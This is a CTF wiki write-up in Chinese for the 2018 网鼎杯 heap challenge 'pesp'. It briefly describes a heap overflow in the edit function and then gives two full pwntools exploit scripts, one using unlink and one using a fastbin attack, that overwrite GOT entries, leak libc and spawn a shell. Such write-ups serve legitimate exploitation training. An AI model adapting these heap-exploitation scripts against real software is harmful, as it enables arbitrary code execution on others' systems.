# ctf_wiki: pesp (网鼎杯2018)

## 功能

![](media/16050216587691/16050897684632.jpg)

## 漏洞

![](media/16050216587691/16051004607809.jpg)

edit 功能长度没有限制，存在堆溢出。

![](media/16050216587691/16051005079246.jpg)

同时还有 off-by-null ，然而不便于利用。

## exp1 : unlink

```python
#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./pesp"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice:",str(idx))

def add(length,content):
    opt(2)
    p.sendlineafter("Please enter the length of servant name:",str(length))
    p.sendafter("Please enter the name of servant:",str(content))

def free(idx):
    opt(4)
    p.sendlineafter("Please enter the index of servant:",str(idx))

def edit(idx,length,content):
    opt(3)
    p.sendlineafter("Please enter the index of servant:",str(idx))
    p.sendlineafter("Please enter the length of servant name:",str(length))
    p.sendlineafter("Please enter the new name of the servnat:",str(content))

def show():
    opt(1)


add(0x30,"a"*0x20) # 0
add(0x80,"a"*0x20) # 1
add(0x20,"a"*0x20) # 2
x = 0x6020c8
fake_fd = x-0x18
fake_bk = x-0x10
payload = flat([
    0,0x20,
    fake_fd,fake_bk,
    0x20,0,
    0x30,p8(0x90)
    ])

edit(0,len(payload),payload)
free(1)

payload = flat([
    0x00007ffff7dd18e0,0,
    0x30,elf.got["free"],
    0x30,elf.got["atoi"],
    # 0x30,elf.got["atoi"],
    # 0x30,elf.got["atoi"],
    ])
edit(0,len(payload),payload)

show()
p.recvuntil("0 : ")
libc_base = u64(p.recv(6).ljust(8,"\0")) - libc.sym["free"]
system_addr = libc_base + libc.sym["system"]
log.success("system_addr addr "+ hex(system_addr))

payload = flat([
    system_addr
    ])

edit(1,len(payload),payload)
p.sendline("/bin/sh\x00")

# gdb.attach(p,"set $h=0x603020,$g=0x6020C0")


p.interactive()
```

## exp2: fastbin attack

```python
#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./pesp"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice:",str(idx))

def add(length,content):
    opt(2)
    p.sendlineafter("Please enter the length of servant name:",str(length))
    p.sendafter("Please enter the name of servant:",str(content))

def free(idx):
    opt(4)
    p.sendlineafter("Please enter the index of servant:",str(idx))

def edit(idx,length,content):
    opt(3)
    p.sendlineafter("Please enter the index of servant:",str(idx))
    p.sendlineafter("Please enter the length of servant name:",str(length))
    p.sendlineafter("Please enter the new name of the servnat:",str(content))

def show():
    opt(1)


add(0x50,"a"*0x50) # overflow 0
add(0x50,"a"*0x50) # 1
add(0x50,"a"*0x50) # 2

target = elf.got["free"] - 0x1e

free(2)
free(1)

# index 0

payload = flat([
    "a"*0x50,
    0,0x61,
    target
    ])

edit(0,len(payload),payload)

add(0x50,"a") # 1

# payload = flat([
    # "\xff\xf7\xff\x7f\x00\x00",
    # 0x7ffff7deef10,
    # "\x00\x07\x40\x00\x00"
# ])
# add(0x50,payload) # free@got -> printf@plt index 4
add(0x50,"a") #2
payload = flat([
    "\xff\xf7\xff\x7f\x00\x00",
    0x7ffff7deef10,
    "\x00\x07\x40\x00\x00"
])
edit(2,len(payload),payload)

payload = "%17$p"
edit(0,len(payload),payload)
free(0)

offset = 0x20840
libc_base = int(p.recv(14),16) - offset
system_addr = libc_base + libc.sym["system"]
log.success("system address is -> "+ hex(system_addr))


payload = flat([
    "\xff\xf7\xff\x7f\x00\x00",
    0x7ffff7deef10,
    p64(system_addr)[:6]
    ])
edit(2,len(payload),payload)

payload = "/bin/sh\x00"
edit(1,len(payload),payload)
free(1)

# gdb.attach(p,"set $h=0x603020,$g=0x6020C0")
p.interactive()
```
